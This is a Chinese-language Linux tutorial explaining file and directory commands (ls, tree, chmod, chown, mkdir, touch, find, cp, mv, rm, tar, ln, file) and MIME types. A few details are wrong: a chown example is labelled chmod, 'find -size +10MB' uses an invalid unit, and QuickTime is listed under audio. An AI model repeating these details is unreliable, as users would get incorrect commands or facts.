为输出内容添加颜色以区分不同文件类型\nnever不显示，auto自动显示（默认），always强制使用 -C 按列显示\n默认行为，当输出不是终端时生效 -x 横向显示文件名\n按行排列 -N 显示文件名时不对特殊字符转义（显示原始文件名） \u0026ndash;group-directories-first 让目录显示在前，文件显示在后 \u0026ndash;time=WORD 指定使用哪种时间\nmtime/modification修改时间（默认）\natime/access/use访问时间\nctime/change状态改变时间\nbirth创建时间 排序方式 参数 功能说明 -t 按修改时间排序，最新的文件排在最前面 -S 按文件大小排序，最大的文件排在最前面 -r 将当前的排序结果反向排列 -X 按文件扩展名的字母顺序排序 -c 按文件状态改变时间排序（如权限变更时间） 排序方式 —— sort --sort=WORD可以指定排序方式\nWORD 排序方式说明 none 不排序，按目录项原始顺序显示（通常是创建顺序） name 按名称（文件名）排序（默认行为） extension 或 version 按文件扩展名排序 size 按文件大小排序（大文件在前） time 按默认时间（即--time=modification）排序 atime 或 access 或 use 按访问时间排序 ctime 或 status 按状态更改时间排序（如权限改变） birth 按创建时间排序（如果系统支持） 使用示例 显示/dev目录下所有以sd开头的文件列表（结合通配符）\nls /dev/sd* 依据文件内容大小进行排序，显示指定目录里的文件名以及详细信息（组合使用参数）\nls -Sl /etc 从这里也能看出，linux命令参数是不需要使用多个-的（-S -l），写在一起即可（-Sl）\ntree —— 以树状图格式显示目录内容 tree会以图形化的树状结构来显示文件和目录，比ls命令更直观、更清晰地展示目录的层次关系\n并非所有Linux发行版的最小化安装都自带此命令\n语法格式 tree [参数] [目录路径] 常用参数 核心功能 参数 功能说明 -d 只显示目录，不显示文件 -L \u0026lt;层级\u0026gt; 指定要显示的目录层级深度\n例如，-L 2表示最多显示到第二层目录 -f 显示每个文件或目录的完整路径前缀 -a 显示所有文件，包括以.开头的隐藏文件 格式控制 参数 功能说明 -h 以人类可读的格式（如 K, M, G）显示文件大小 -p 显示文件和目录的权限 -u 显示文件或目录的所有者 -g 显示文件或目录的所属组 \u0026ndash;du 显示每个目录包含内容的总大小 内容筛选 参数 功能说明 -P PATTERN 只显示匹配PATTERN通配符模式的文件和目录 -I PATTERN 不显示匹配PATTERN通-符模式的文件和目录 使用示例 展示/etc目录下两层内的目录结构\ntree -d -L 2 /etc 只显示当前目录结构中所有以.c或.h结尾的文件\ntree -P \u0026#34;*.c|*.h\u0026#34; 目录本身还是会显示出来，只是不再显示具体的文件，以便维持树状结构\n显示当前目录的结构，但排除bak和none这两个目录\ntree -I \u0026#34;bak|none\u0026#34; chmod —— 更改文件或目录的访问权限 chmod全称是change mode(改变模式)，其功能是更改文件或目录的访问权限，决定了哪些用户可以对它们进行读、写、执行等操作\n语法格式 数字模式 chmod [参数] \u0026lt;八进制权限码\u0026gt; \u0026lt;文件名\u0026gt;/\u0026lt;目录名\u0026gt; 符号模式 chmod [参数] [who][operator][permission] \u0026lt;文件名\u0026gt;/\u0026lt;目录名\u0026gt; Linux文件权限模型 Linux中的文件和目录权限使用三种基本权限 (Permission)：\nr: read (读权限) w: write (写权限) x: execute (执行权限) 对文件而言： 是否能运行这个文件 对目录而言：是否可以进入该目录（cd）或使用该路径（ln） 而这三个权限分别对应着八进制数值：\n读（r） = 4 写（w） = 2 执行（x） = 1 通过将这些权限数值相加，可以组合出不同的权限（-表示没有对应权限），比如：\n数字 权限组合 含义 7 4+2+1 = rwx 可读、可写、可执行 6 4+2 = rw- 可读、可写 5 4+1 = r-x 可读、可执行 4 4 = r\u0026ndash; 只读 0 0 = \u0026mdash; 没有权限 Linux中权限分配给三类用户 (Who)：\nu: user (文件所有者) g: group (文件所属组) o: others (其他人) 除此之外还有一个表示三类用户集合的标志：\na: all (所有人, u, g, o的合集) u、g、o分别对应三个八进制权限码数值，利用三位数字组合我们就能表示出三类用户的权限，例如权限值 755 就表示：\n用户权限：7（rwx） 组权限：5（r-x） 其他权限：5（r-x） 常见权限对应关系如下：\n权限值 符号形式 含义 777 rwxrwxrwx 所有人可读写执行（不安全） 755 rwxr-xr-x 用户有全部权限，其他用户只能读执行 700 rwx\u0026mdash;\u0026mdash; 仅用户本人拥有权限 644 rw-r\u0026ndash;r\u0026ndash; 用户可读写，其他用户只读 600 rw\u0026mdash;\u0026mdash;- 仅用户本人可读写（常用于私密文件） 可以使用之前学过的ls -l命令查看权限，例如：\ndrwxr-xr-x 2 user group 4096 Jul 29 10:00 mydir 其中的rwxr-xr-x就是755\n符号模式 这是chmod最直观易读的用法，它通过明确的符号来增、删或设定权限\n符号模式的命令由三部分构成（各部分之间没有空格，下面加空格是为了方便观看）：\n[who] [operator] [permission] who (作用对象)：指定要为哪类用户更改权限 u: user/所有者 g: group/所属组 o: others/其他人 a: all/所有人（如果省略who，则默认为a） operator (操作符)：指定要执行的操作 +: 添加指定的权限 -: 移除指定的权限 =: 覆盖原有的权限，只给予指定的权限 permission (权限)：指定r, w, x中的一种或多种 将这三部分组合起来，就可以精确地调整权限\n可以同时进行多个组合，用逗号,隔开\n常用参数 命令行选项 参数 功能说明 -R 递归地更改目录及其下所有文件和子目录的权限 -v 显示详细过程，显示每个文件权限的更改情况 -c 只在权限确实发生更改时才显示报告 \u0026ndash;reference=\u0026lt;参考文件\u0026gt; 将权限设置成参考文件的权限 使用示例 数字模式 这是最常用的设置权限的方法，但是需要一些记忆\n为脚本添加执行权限\nchmod 755 my_script.sh 这是常见用法之一，755权限(rwxr-xr-x)意味着：所有者可以读、写、执行；所属组和其他人可以读和执行，这使得脚本可以被所有者修改，被所有人执行\n设置一个私密文件\nchmod 600 private_key.pem 600权限(rw-------)意味着只有文件所有者可以读写该文件，其他人没有任何权限\n将/var/www/html目录以及其下所有文件和子目录的权限都设置为755（目录）或644（文件）\nchmod -R 755 /var/www/html 符号模式 这种模式在不希望重新计算整个三位数字，只想微调某个权限时非常有用，很方便\n为所有用户添加执行权限\nchmod a+x file 与chmod 755一样，常见于设置脚本权限\n为所属组和其他人移除写权限\nchmod go-w file 为文件所有者设置固定的读写权限\nchmod u=rw file 其他 把new.txt文件权限修改成和old.txt一样\nchmod --reference=old.txt new.txt chgrp \u0026amp; chown —— 更改文件或目录的所有者和所属组 chgrp名称来源于 “change group”，专门用于更改文件或目录的所属组\nchown名称来源于 “change owner”，它更加强大，也更加常用，因为它既可以更改文件或目录的所有者，也可以同时更改所属组\n语法格式 chown chown [参数] \u0026lt;新所有者\u0026gt;[:\u0026lt;新所属组\u0026gt;] \u0026lt;文件\u0026gt;/\u0026lt;目录\u0026gt; chgrp chgrp [参数] \u0026lt;新所属组\u0026gt; \u0026lt;文件\u0026gt;/\u0026lt;目录\u0026gt; Linux所有者与所属组 在Linux中，每个文件和目录都有一个所有者（Owner）和一个所属组（Group），所有者通常是创建该文件的用户，而所属组允许多个用户共享对文件的访问权限，一个用户可以属于多个组\n更改所有权通常需要管理员权限（sudo）\n用户名称和组名称在系统里是分开的：\n用户名存储在/etc/passwd文件\n组名存储在/etc/group文件\n因此，我们可以创建一个用户名叫alice，也可以有一个组名叫alice，它们是不同的实体，不冲突\n常用参数 这两个命令的大部分核心参数是通用的，只有--from例外，是chown独有\n参数 功能说明 -R 递归地更改目录及其子目录下所有文件和目录的所有权 -v 显示详细过程，为每个被处理的文件打印一条所有权变更的消息 -c 只在所有权确实发生改变时才显示详细过程 \u0026ndash;from=\u0026lt;当前归属\u0026gt; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-(chown独有)\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; 仅当文件的当前所有者和/或组匹配指定值时，才更改其所有权 \u0026ndash;reference=\u0026lt;参考文件\u0026gt; 使用参考文件的所有者和所属组来设置目标文件，而不是自己指定 使用示例 将file.txt的所有者更改为用户alice\nsudo chown alice file.txt 更改文件的所属组\n使用chgrp：\nsudo chgrp newgroup file.txt 使用chmod：\nsudo chown :newgroup file.txt 将file.txt的所有者设置为newuser，所属组设置为newgroup\nsudo chown newuser:newgroup file.txt 将目录/var/www/html及其下所有文件和子目录的所有者和所属组都设置为名为www-data的用户和组\nsudo chown -R www-data:www-data /var/www/html www-data是Linux中常用的Web服务器（比如 Apache、Nginx）运行的用户和组\nmkdir —— 创建目录文件 语法格式 mkdir [参数] \u0026lt;目录名1\u0026gt; \u0026lt;目录名2\u0026gt;... Linux的umask权限控制 在Linux中，每个新创建的目录或文件都会根据当前的umask值决定其默认权限\numask是权限掩码，它会从默认的最大权限中\u0026quot;减去\u0026quot;（实际不是减法）指定的值，结果就是新建文件或目录的默认权限：\n默认权限 = 最大权限 - umask umask有四位，通常我们设置umask只关注后三位（用户、组、其他），第一位用于以下特殊权限控制：\n权限位 名称 作用 4 setuid 文件以创建者身份运行（对文件） 2 setgid 组权限继承（对目录） 1 sticky 只有文件所有者可删除（对目录） 但在大多数实际中，umask的第一位几乎都是 0\n因为我们通常不通过umask控制特殊权限，而是用chmod +s、+t显式设置\n对于目录，最大默认权限是 777；对于文件，最大默认权限是 666（因为默认不为新文件设置执行权限）\n例如：\numask 为 0022 新建目录的权限为 777 - 022 = 755 新建文件的权限为 666 - 022 = 644 可以使用umask命令查看当前掩码，也可以使用umask新值来设置，例如：\numask 0027 这将修改新建目录权限为750（777-027），文件权限为640（666-027）\n这里需要解释一个误区：umask其实不是减法，而是按位操作，先对umask取反后与运算：\n默认权限 = 最大权限 \u0026amp; (~umask) 比如上面的umask 0027，文件权限为 640（666-027），你会发现6-7不等于0，但按位计算就是对的\n我们使用二进制表示，分别计算每一位：\n类别 默认权限 (666) umask (0027) ~umask (按位取反) 实际权限（按位与） 所有者 110 000 111 110 （rw-） 所属组 110 010 101 100 （r\u0026ndash;） 其他人 110 111 000 000 （\u0026mdash;） 合起来就是640，即rw-r-----\n常用参数 核心功能 参数 功能说明 -p 递归创建\n当需要创建的目录，其父目录尚不存在时，这个参数会自动创建所有不存在的父目录\u0026lt;br / -v 显示详细过程\n每创建一个新目录，都会打印一条消息。 权限控制 参数 功能说明 -m 设置权限\n在创建目录的同时，直接为其设定权限（例如-m 755），忽略系统的umask默认值 使用示例 在当前位置一次性创建多个目录\nmkdir docs images scripts 创建多级目录，并显示创建过程\nmkdir -pv dir1/dir2/dir3/ 创建一个权限为777的目录\nmkdir -m 777 dir touch —— 创建空文件/更新文件的时间戳 touch有两个主要功能：\n如果文件不存在，则创建一个新的空文件\n如果文件已存在，则更新该文件的访问和修改时间戳为当前时间\n语法格式 touch [参数] \u0026lt;文件名\u0026gt; Linux文件时间戳 Linux系统为每个文件维护的三个主要时间戳：\n访问时间 (atime): 最后一次访问（读取）文件内容的时间。 修改时间 (mtime): 最后一次修改文件内容的时间。这是我们用ls -l默认看到的时间 更改时间 (ctime): 最后一次更改文件元数据（metadata，如权限、所有者）或内容的时间 touch命令的主要作用就是更新这些时间戳，特别是atime和mtime\n常用参数 参数 功能说明 -a 只更改文件的访问时间（atime） -m 只更改文件的修改时间（mtime） -c 如果文件不存在，不创建新文件 -r \u0026lt;文件\u0026gt; 使用另一个文件的时间戳来更新目标文件，而不是使用当前时间 -d \u0026lt;日期字符串\u0026gt; 使用指定的日期字符串\u0026quot;YYYY-MM-DD HH:MM:SS\u0026quot;来更新时间戳 -t \u0026lt;时间戳\u0026gt; 使用指定的[CC]YYMMDDhhmm[.ss]格式的时间戳来更新 使用示例 创建多个空文件\ntouch read.md file.txt note.log 更新一个已存在文件的时间戳\ntouch file.txt 将new.txt的时间戳设置得和old.txt完全一样\ntouch -r old.txt new.txt 如果new.txt不存在，touch会创建new.txt文件，并将其时间戳设置为old.txt的时间戳\n创建一个指定日期的文件\ntouch -d \u0026#34;2023-01-01 12:30:00\u0026#34; time.txt 创建一个指定时间戳的文件\ntouch -t 202508011030.45 time.txt find —— 在目录中搜索文件 find会递归地遍历指定的目录树，根据用户设定的条件来查找文件，并能对查找到的文件执行指定的操作\n语法格式 find \u0026lt;起始路径\u0026gt; \u0026lt;表达式\u0026gt; / | \\ \u0026lt;选项\u0026gt; \u0026lt;测试\u0026gt; \u0026lt;动作\u0026gt; find命令的核心：表达式引擎 与其他命令使用简单参数不同，find命令的核心是一系列可以组合的表达式：\n\u0026lt;选项\u0026gt; \u0026lt;条件\u0026gt; \u0026lt;动作\u0026gt; 测试（选项+条件）：用来判断文件是否符合某个条件，例如按名称或大小匹配，如果符合，测试返回真 动作：指定对找到的文件执行什么操作，最常见的动作是打印路径、执行命令 操作符：用于组合多个测试，例如-and(与),-or(或),-not(非) 整个find命令就是构建一个逻辑表达式，find会用这个表达式去测试路径下的每一个文件\n常用参数 按名称/路径测试 参数 功能说明 -name /PATTERN/ 按文件名匹配（区分大小写），支持通配符*和? -iname /PATTERN/ 按文件名匹配（不区分大小写） -path /PATTERN/ 按完整路径（包含目录名和文件名）进行匹配 -regex /PATTERN/ 使用正则表达式匹配完整路径 按类型/大小/时间测试 参数 功能说明 -type TYPE 按文件类型查找\nf代表普通文件，d代表目录，l代表符号链接 -size N[cwbkMG] 按文件大小查找\nN是数字，+N表示大于N，-N表示小于N，N表示等于N\nN的单位：c(字节)，w(字,2字节)，b(块,512字节)，k(KB)，M(MB)，G(GB) -mtime N 按修改时间查找\nN代表天数+N表示超过N天前修改，-N表示N天内修改，N表示正好第N天前修改 -ctime N 按状态改变时间查找\n类似-mtime，针对权限、所有者等属性变化时间 -atime N 按访问时间查找\n类似-mtime，针对最后访问时间 -user NAME 按文件所有者查找 -group NAME 按文件所属组查找 -perm MODE 按文件权限查找\n支持数字（如0755）或符号模式（如u=rwx,g=rx,o=rx）\nMODE表示权限正好等于，-MODE表示完全包含，/MODE表示任意一位包含 对结果执行的动作 参数 功能说明 -print 打印出匹配文件的完整路径\n这是find的默认动作，通常可以省略 -ls 对匹配的文件执行ls -lids命令，显示详细信息 -delete 删除找到的文件 -exec COMMAND {} ; 对每个找到的文件执行指定的COMMAND命令\n{}会被替换为当前文件名，\\;表示命令结束，必须转义！ -ok COMMAND {} ; 与-exec类似，但在执行每个命令前会进行交互式确认 -prune 跳过指定目录，不进入递归查找\n常用：find \u0026lt;起始目录\u0026gt; -path \u0026quot;\u0026lt;要排除的路径\u0026gt;\u0026quot; -prune -o \u0026lt;其他查找条件\u0026gt; \u0026lt;动作\u0026gt;\n如果要排除多个目录，可以写多个 -path ... -prune 条件组合 逻辑操作符 操作符 完整形式 功能说明 -a -and 逻辑与（默认行为，可省略）表示两个条件都满足 -o -or 逻辑或，表示只要满足任一条件即可 ! -not 逻辑非，取反，表示不满足某个条件 () 无 组合多个条件表达式，用于改变默认的优先级，括号需加转义：\\( 和 \\) 使用示例 在/log目录下，查找所有类型为普通文件且大小超过10MB的文件，并列出详细信息\nfind /log -type f -size +10MB -ls 查找/etc目录下，最近7天内被修改过的所有文件\nfind /etc -mtime -7 查找/home下所有所有属于用户alice的，且权限为777的文件\nfind /home -type f -user alice -perm 777 在当前目录及其所有子目录下，查找所有以.log结尾的文件，并移动到/log中\nfind . -name \u0026#34;*.log\u0026#34; -exec mv -n {} /log/ \\; 找出所有包含了“main”这个词的C语言源文件\nfind . -type f -name \u0026#34;*.c\u0026#34; -exec grep -l \u0026#34;main\u0026#34; {} \\; 在/home下查找所有.txt和.png文件，但跳过其中的/log和/mod子目录，并打印出完整路径\nfind /home \\( -path \u0026#34;./log\u0026#34; -o -path \u0026#34;./mod\u0026#34; \\) -prune -o \\( -name \u0026#34;*.txt\u0026#34; -o -name \u0026#34;*.png\u0026#34; \\) -print \\( -path \u0026quot;./log\u0026quot; -o -path \u0026quot;./mod\u0026quot; \\) -prune：排除这两个目录 -o：如果不是被剪枝的目录，则继续执行下一部分 \\( -name \u0026quot;*.txt\u0026quot; -o -name \u0026quot;*.png\u0026quot; \\)：查找 txt 或 png 文件 -print：打印完整路径 最好使用括号包裹过滤和查找的条件，否则无法保证结果\ncp —— 复制文件/目录 语法格式 cp [参数] \u0026lt;源文件1\u0026gt; \u0026lt;源文件2\u0026gt;... \u0026lt;目标文件名\u0026gt; Linux文件属性 cp命令的很多参数都与文件属性相关，这些我们在上文大多都提到过：\n每个文件和目录都有其所有者和所属组 每个文件都有读（r）、写（w）、执行（x）的权限 这些权限分别针对\u0026quot;所有者\u0026quot;、\u0026ldquo;所属组\u0026rdquo;、\u0026ldquo;其他人\u0026rdquo; 每个文件都有多个时间戳，最常用的是最后修改时间 常用参数 核心功能 参数 功能说明 -r, -R 递归复制\n这是复制目录时必须使用的参数，它会复制该目录下所有的文件和子目录\n最好使用-R，它是更标准化的写法 -i 交互模式\n在覆盖一个已存在的文件前，会先进行提示并要求用户确认 -n 不覆盖已存在的文件\n如果在目标位置有同名文件，则跳过该文件的复制 -u 更新复制\n仅当源文件比目标文件新，或者目标文件不存在时，才执行复制操作 -v 显示详细过程\n列出每个正在被复制的文件名 -p 保留文件属性\n复制时，使新文件保留源文件的权限、所有者、时间戳等属性 链接 参数 功能说明 -d 保留符号链接\n当复制一个符号链接（软链接）时，直接复制链接本身，而不是它所指向的文件 -l 创建硬链接，而不是复制文件内容 -s 创建符号链接，而不是复制文件内容 -a 归档模式\n这是一个强大的组合参数，通常等效于-dR --preserve=all (在某些系统中是-pPR)\n它表示递归复制、保留链接、并保留所有文件属性，常用于备份 强制 参数 功能说明 -f 强制\n如果目标文件已存在且无法打开进行写入，cp会先尝试将其删除，然后再复制 备份 参数 功能说明 --backup[=CONTROL]\n或-b[=CONTROL] 为每个已存在的目标文件创建一个备份 这个和-a参数不同，是用来备份目标位置同名文件的，防止误覆盖\nCONTROL可选值：\n值 说明 none 不进行备份（与不加--backup等效） numbered 使用编号方式备份文件，如：file~, file.~1~, file.~2~ 等 existing 如果之前使用的是numbered，则继续编号；否则使用 simple（见下） simple 简单备份，文件名加一个 ~ 号，如：file~ 如果省略=CONTROL，则使用默认的备份方式，通常是existing\n使用示例 递归复制整个文件夹到指定目录下，如果目标已存在则提示是否覆盖\ncp -Ri dir1/ dir2/ 复制文件到/etc目录下，覆盖已有文件不再询问\ncp -f file /etc 递归复制文件夹的内容到指定目录下，保留所有属性，只更新变动过的文件，并显示过程\ncp -auv dir1/. dir2/ 注意这里使用的是dir1/.而不是dir1/，区别在于前者不包括目录dir1本身，只包括其中内容\n结合{}，把file1复制为file1.bak\ncp file1{,.bak} 这里的命令展开就是cp file1 file1.bak，是一个非常巧妙的缩写方法\nmv —— 移动/重命名文件 语法格式 mv [参数] \u0026lt;源文件或目录\u0026gt; mv的工作原理 mv行为根据操作是否在同一个文件系统内而有所不同\n在同一个文件系统内移动 此操作几乎是瞬时完成的\nmv并不会真的移动磁盘上的数据，它只是修改了文件的路径记录（inode中的指针），所以速度极快\n在不同的文件系统间移动 这个过程的速度取决于文件的大小\n例如从本地硬盘移动到U盘，此时mv无法只修改路径记录，它会执行一个完整的复制操作，将文件内容从源位置复制到目标位置，然后在确认复制成功后删除原始文件，实际上相当于先执行cp再执行rm\n其实类似windows在不同盘符之间移动文件\n常用参数 核心功能 参数 功能说明 -i 交互模式\n在覆盖一个已存在的文件前，会先进行提示并要求用户确认，可以有效防止误操作 -n 不覆盖已存在的文件\n如果在目标位置有同名文件，则跳过该操作 -u 更新\n仅当源文件比目标文件新，或者目标文件不存在时，才执行移动操作 -v 显示详细过程\n列出每个文件在移动前后的路径 强制 参数 功能说明 -f 强制\n不经任何提示，直接覆盖已存在的目标文件，通常是默认行为，与-i相反 备份 参数 功能说明 -b[=CONTROL] **备份\n**在覆盖已存在的目标文件时，会为原目标文件创建一个备份 具体使用方法和cp命令该参数一致：cp备份 使用示例 重命名txt文件为jpg\nmv file.txt file.jpg 也可以使用{}一步到位：\nmv file.{txt,jpg} 将当前目录下所有以.log结尾的文件，一次性全部移动到logs目录中（结合通配符）\nmv *.log logs/ 移动文件，显示过程，并进行确认\nmv -iv file dir/ 目录名称最好加上/表示为目录，否则可能进行重命名操作（如果没有该目录的话）\n将目录移动到tmp目录下\nmv dir/ /tmp/ 与cp不同，mv在移动目录时不需要-r参数\nrm —— 删除文件或目录 语法格式 rm [参数] \u0026lt;文件或目录\u0026gt; Linux文件删除的重要特性 与Windows等图形界面的“移动到回收站”不同，rm命令默认是永久性删除 一旦文件被rm删除，通常情况下无法轻易恢复，使用时谨慎再谨慎！ 常用参数 参数 功能说明 -r, -R 递归删除\n这是删除目录时必须使用的参数，它会删除该目录下所有的文件和子目录 -f 强制删除\n忽略不存在的文件，并且从不提示用户进行确认，即使文件是只读的，也会直接删除。 -i **交互模式\n**在删除每个文件前都会进行提示并要求用户确认，可以有效防止误删 -v 显示详细过程，列出每个正在被删除的文件名 使用示例 删除目录下多个文件，每个文件删除之前询问**（结合通配符）**\nrm -i *.tmp 递归删除整个目录及其内容\nrm -r old_project/ 强制递归删除整个目录\nrm -rf dir/ 这个命令组合会强制、无提示地删除一个目录及其全部内容！\n这是一个极其危险的命令组合，常被戏称为“删库跑路”，一定要慎用！\nrmdir —— 删除空目录 语法格式 rmdir [参数] \u0026lt;目录名\u0026gt; rmdir 与 rm -r rmdir是一个专门用来删除空目录的命令，如果目录中含有任何文件或子目录，rmdir命令都会执行失败并报错 由于它只能删除空目录，所以它比rm -r要安全得多 常用参数 参数 功能说明 -p **递归删除目录\n**当子目录被删除后，如果其父目录也因此变成了空目录，则一并删除\n依此类推，直到遇到非空目录为止 -v 显示详细过程 使用示例 删除一个空的目录\nrmdir empty_dir 递归删除空的嵌套目录\nrmdir -p dir1/dir2/dir3 首先删除dir3 目录 然后发现dir2目录变空了，于是也删除dir2目录 最后发现dir1目录也变空了，于是也删除dir1目录 通过一条命令，就可以清理掉一整条空的目录路径\n同时删除多个空目录\nrmdir empty_dir1 empty_dir2/xxx/xxx tar —— 文件归档与压缩工具 tar命令是Linux中用于打包归档和压缩/解压文件的核心工具\n它的名称是 tape archive（磁带归档）的缩写，最初被设计用于将文件备份到磁带上，现在广泛用于将多个文件和目录打包成一个单独的文件\n语法格式 tar命令的参数风格比较独特，其主选项通常不需要在前面加-，但为了统一和清晰，加上-也是完全兼容的\n创建归档 tar [主选项][辅助选项] \u0026lt;归档文件名\u0026gt; \u0026lt;要归档的文件或目录...\u0026gt; 查看归档内容 tar [主选项][辅助选项] \u0026lt;归档文件名\u0026gt; 提取归档内容 tar [主选项][辅助选项] \u0026lt;归档文件名\u0026gt; [要提取的文件...] 归档与压缩 理解tar，需要先区分这两个概念\n归档 这是tar的本职工作，它将许多文件和目录打包成一个单独的大文件（通常称为tarball，以.tar结尾）\n这个过程不减小文件总体积，就像把很多零散物品放进一个大箱子里\n压缩 这是减小文件体积的过程，由gzip, bzip2, xz等专门的压缩工具完成\n通常，我们先用tar将文件归档成一个.tar文件，然后再用gzip等工具将其压缩成.tar.gz\ntar命令提供了便捷的参数（-z, -j, -J），可以在一条命令内连续完成“归档”和“压缩”两个步骤\n常用参数 主选项（必须选择其一） 参数 功能说明 -c 创建一个新的归档文件 -x 从归档文件中提取文件 -t 列出归档文件中的内容，但不提取 -r 向已存在的归档文件末尾追加文件 -u 更新。仅当文件比归档中的同名文件新时，才将其追加到归档中 辅助选项（常用） 参数 功能说明 -f 指定归档文件的名称\n这个参数几乎总是必需的，并且通常放在参数组合的最后 -v 显示详细过程。在处理文件时，将其名称打印在屏幕上 -z 通过gzip进行压缩或解压，生成的文件通常以.tar.gz或.tgz结尾 -j 通过bzip2进行压缩或解压，生成的文件通常以.tar.bz2或.tbz2结尾 -J 通过xz进行压缩或解压，生成的文件通常以.tar.xz结尾 -C 指定一个目录，在解压时，tar会先切换到这个目录，再开始提取文件 \u0026ndash;exclude=PATTERN 在归档时，排除掉匹配PATTERN模式的文件 使用示例 将file文件和dir1目录打包成一个名为archive.tar的归档文件，并显示过程\ntar -cvf archive.tar file1.txt directory1/ 先写打包后的名称（-f），再列举打包的文件\n将两个目录打包并使用gzip压缩，生成archive.tar.gz\ntar -czf archive.tar.gz dir1/ dir2/ 不解压文件，只列出archive.tar.gz压缩包里包含哪些文件和目录\ntar -tzf archive.tar.gz 解压定要选择-x，不选择就不会解压，只是预览\n将archive.tar.gz解压到当前tmp/目录，并显示解压过程\ntar -xzvf archive.tar.gz -C /tmp ln —— 创建文件或目录的链接 ln的名称是 link 的缩写，用于为文件或目录创建链接\n语法格式 ln [参数] \u0026lt;源文件\u0026gt;/\u0026lt;目录\u0026gt; \u0026lt;链接名\u0026gt; 硬链接 (Hard Link) vs. 符号链接 (Symbolic Link) 链接是Linux文件系统的一个重要特性，它允许一个文件拥有多个可访问的路径\nln命令能创建的两种不同的链接类型：硬链接和符号链接（也称软链接）\n特性 硬链接 (Hard Link) 符号链接 (Symbolic Link / Soft Link) 本质 是同一个文件的多个别名，它们共享同一个inode号和数据块，除了路径不同外都共享 是一个独立的文件，其内容是另一个文件的路径，类似Windows的快捷方式 inode号 与源文件相同 拥有自己独立的inode号 权限和访问控制 继承原文件权限 链接权限由链接自身决定（但一般是777），访问成功与否由目标文件的权限决定，同时也要考量是否能进入目标文件所在的目录（对该目录的执行权限） 是否能识别为链接 ❌用ls -l看不出是否为硬链接（除非看 inode） ✅用ls -l明确显示为链接，如 link -\u0026gt; target 跨文件系统 ❌不能跨越不同的文件系统创建 ✅可以跨越不同的文件系统创建 对目录操作 ❌不能对目录创建硬链接 ✅可以对目录创建符号链接 删除源文件后 链接文件依然有效，可以正常访问数据（直到所有硬链接都被删除） 链接文件会失效，因为其指向的路径不再存在 常用参数 参数 功能说明 -s 创建符号链接（软链接），不加此参数则默认创建硬链接 -f 强制\n如果目标位置已存在同名文件或链接，则先将其删除再创建 -i 交互模式\n在覆盖（删除）已存在的目标文件前进行提示 -v 显示详细过程\n显示每个成功创建的链接 使用示例 为file.txt创建一个名为hard_link.txt的硬链接\nln file.txt hard_link.txt 可以使用ls -i命令查看，会发现它们的inode号完全相同\n在用户主目录下强制创建一个名为nginx_access.log的符号链接，指向Nginx的访问日志文件\nln -sf /var/log/nginx/access.log ~/nginx_access.log 为/mnt/disk1这个目录创建一个符号链接\nln -s /mnt/disk1 ~/disk1_link 执行cd ~/disk1_link就等同于执行cd /mnt/disk1，和快捷方式是一个用法\nfile —— 辨别文件类型 file命令是Linux中一个用于探测并显示文件类型的工具\n它不依赖于文件的扩展名，而是通过一系列的测试来确定文件的真实类型\n语法格式 file [参数] \u0026lt;文件名\u0026gt; Linux文件类型与“魔数” 在Windows系统中，文件类型通常由其扩展名（如.txt, .exe）决定\n然而，在Linux中，文件扩展名主要是为了方便用户识别，系统本身并不依赖扩展名来判断文件类型\n一个可执行文件可以没有任何扩展名！\nfile命令主要通过三种测试来判断文件类型：\n文件系统测试：首先检查文件是否是目录、符号链接、Socket等内核已知的特殊文件 魔数测试：接下来，它会检查文件开头的几个字节，这部分字节被称为**“魔数”（Magic Number）**，几乎所有标准文件类型（如JPEG, PNG, ELF可执行文件）都有一个独特的、像“指纹”一样的魔数 语言测试：如果文件看起来像是一个文本文档，file会尝试分析其内容，判断它可能是哪种编程语言的源码（如C, Shell, Python）或配置文件 常用参数 核心功能 参数 功能说明 -b 简介模式\n不输出文件名，只输出文件类型描述 -i 以MIME类型格式输出，而不是人类可读的描述\n例如输出image/jpeg而不是JPEG image data... -L 跟随符号链接\n默认情况下，file会报告这是一个符号链接；使用此参数，它会去分析链接指向的那个原始文件。 -z 尝试查看压缩文件内部的内容类型 文件列表控制 参数 功能说明 -f \u0026lt;列表文件\u0026gt; 从指定的列表文件中读取要检查的文件名列表，而不是在命令行上指定 使用示例 识别一个未知文件的类型\nfile unknown_file 输出示例： unknown_file: PNG image data, 1024 x 768, 8-bit/color RGB, non-interlaced\nfile可以清晰地区分可执行的二进制文件和可读的文本文件\n# 查看bash程序的文件类型 file /bin/bash # 查看一个shell脚本的类型 file ~/.bashrc 输出示例： /bin/bash: ELF 64-bit LSB pie executable, x86-64... ~/.bashrc: UTF-8 Unicode text\n查看符号链接及其指向的原始文件\n# 先创建一个符号链接 ln -s /bin/bash ./my_bash_link # 默认行为：识别链接本身 file my_bash_link # 使用-L参数：识别链接指向的文件 file -L my_bash_link 输出示例： my_bash_link: symbolic link to /bin/bash my_bash_link: ELF 64-bit LSB pie executable, x86-64...\n批量识别文件类型\nfile * file拓展 —— MIME类型 什么是MIME类型 MIME（Multipurpose Internet Mail Extensions）类型，又称为媒体类型（Media Type），用于标识文件或数据的格式和性质\n它最初为电子邮件附件设计，但现在广泛应用于HTTP协议、浏览器内容协商等\nMIME类型的格式 type/subtype type是主类型（比如 text, image, application 等） subtype是具体的格式（比如 jpeg, png, json） 常见MIME类型 text 子类型（常见格式） 说明 plain 纯文本内容，无格式修饰（如.txt文件） html HTML超文本标记语言（网页源代码） css 层叠样式表（网页样式） csv 逗号分隔值文本，常用于表格或数据库导出 javascript / js JavaScript脚本代码 xml 可被人类和机器读取的标签化数据格式 markdown / md Markdown标记语言，常用于文档编写 yaml / yml 简洁的配置文件格式，常用于开发与部署 image 子类型（常见格式） 说明 jpeg / jpg 有损压缩的位图图像格式 png 无损压缩的位图图像格式，支持透明 gif 支持动画和透明的图像格式 bmp Windows位图图像格式，不压缩 svg+xml 可缩放的矢量图像，基于XML webp Google开发的高效图像格式，兼顾压缩率和质量 ico Windows图标格式 tiff / tif 高质量图像格式，常用于扫描、印刷 audio 子类型（常见格式） 说明 mpeg / mp3 有损压缩音频格式 wav 无损音频格式，体积大 ogg 开放格式音频容器 aac 高压缩率音频格式，常用于流媒体 flac 无损压缩音频格式 opus 适用于语音和流媒体的高效音频格式 quicktime / mov Apple开发的视频格式，兼容性强 video 子类型（常见格式） 说明 mp4 最常见的视频格式，压缩效率高 mpeg 老的视频格式，兼容性好 ogg 支持视频的OGG容器格式（如.ogv） webm Google开发的为网页优化的视频格式 avi 微软开发的老视频格式 